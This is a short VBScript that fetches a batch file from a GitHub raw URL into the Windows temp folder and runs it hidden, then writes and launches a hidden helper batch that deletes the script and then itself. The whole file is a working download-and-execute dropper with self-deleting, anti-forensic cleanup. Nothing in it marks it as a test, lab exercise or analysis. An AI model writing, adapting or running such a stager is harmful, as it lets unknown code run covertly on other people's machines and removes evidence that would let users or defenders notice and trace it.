Option Explicit

Dim objXMLHttp, objFSO, objFile, strURL, strTempBat, strTempPath, objShell
Dim strBat, objBatFile, wshShell

' URL of your batch file to download
strURL = "https://github.com/vivaanv987-cloud/test/raw/refs/heads/main/Am.bat"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

strTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
strTempBat = strTempPath & "\taskfile.bat"

' Delete existing batch file to avoid access issues
If objFSO.FileExists(strTempBat) Then
    objFSO.DeleteFile strTempBat, True
End If

' Download batch file silently
Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
objXMLHttp.Open "GET", strURL, False
objXMLHttp.Send

If objXMLHttp.Status = 200 Then
    Set objFile = objFSO.CreateTextFile(strTempBat, True)
    objFile.Write objXMLHttp.ResponseText
    objFile.Close

    ' Run batch file hidden and wait for completion
    objShell.Run Chr(34) & strTempBat & Chr(34), 0, True

    ' batch file assumed to have internal self-delete code
End If

' Prepare helper batch file to delete this VBScript
strBat = strTempPath & "\del_" & objFSO.GetFileName(WScript.ScriptFullName) & ".bat"

Set objBatFile = objFSO.CreateTextFile(strBat, True)
objBatFile.WriteLine "@echo off"
objBatFile.WriteLine "ping 127.0.0.1 -n 3 > nul" ' 2-second delay to ensure script exit
objBatFile.WriteLine "del """ & WScript.ScriptFullName & """" ' delete the VBScript file
objBatFile.WriteLine "del %~f0" ' delete this batch file itself
objBatFile.Close

' Run helper batch file hidden and asynchronous (no wait)
Set wshShell = CreateObject("WScript.Shell")
wshShell.Run Chr(34) & strBat & Chr(34), 0, False
